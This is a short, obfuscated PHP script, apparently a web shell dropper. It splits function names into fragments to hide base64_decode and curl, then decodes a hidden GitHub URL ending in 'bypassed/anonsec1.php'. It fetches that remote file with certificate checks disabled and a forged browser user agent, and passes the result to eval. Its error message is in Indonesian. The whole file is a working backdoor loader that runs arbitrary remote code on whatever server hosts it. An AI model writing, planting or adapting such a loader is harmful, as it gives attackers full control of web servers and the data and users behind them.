<?php
error_reporting(0);

$b64 = "ba"."se6"."4_de"."code";
$b63 = $b64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hdzNzaXgvbWF3M3NpeC9yZWZzL2hlYWRzL21haW4vYnlwYXNzZWQvYW5vbnNlYzEucGhw");

function fetchContent($url) {
    $b50 = "cu"."rl_"."ini"."t";
    $b46 = "cu"."rl_"."set"."opt";
    $b49 = "cu"."rl_"."exe"."c";
    $b48 = "cu"."rl_"."err"."no";
    $b47 = "cu"."rl_"."clo"."se";

    $b45 = $b50();
    $b46($b45, CURLOPT_URL, $url);
    $b46($b45, CURLOPT_RETURNTRANSFER, true);
    $b46($b45, CURLOPT_SSL_VERIFYPEER, false);
    $b46($b45, CURLOPT_FOLLOWLOCATION, true);
    $ua = "Mo"."zil"."la/"."5.0 "."(Win"."dows "."NT "."10."."0; "."Win"."64; "."x64) "."Apple"."WebKit"."/"."537.36 "."(KHT"."ML, "."like "."Gecko) "."Chrome"."/"."91.0"."."."4472"."."."124 "."Safari"."/"."537.36";
    $b46($b45, CURLOPT_USERAGENT, $ua);

    $b66 = $b49($b45);
    if ($b48($b45)) {
        $b47($b45);
        return false;
    }
    $b47($b45);
    return $b66;
}

$b65 = fetchContent($b63);

if ($b65 === false || empty($b65)) {
    die("ER"."ROR: "."Gag"."al "."meng"."ambi"."l "."kont"."en.");
}

eval("?>".$b65);
?>
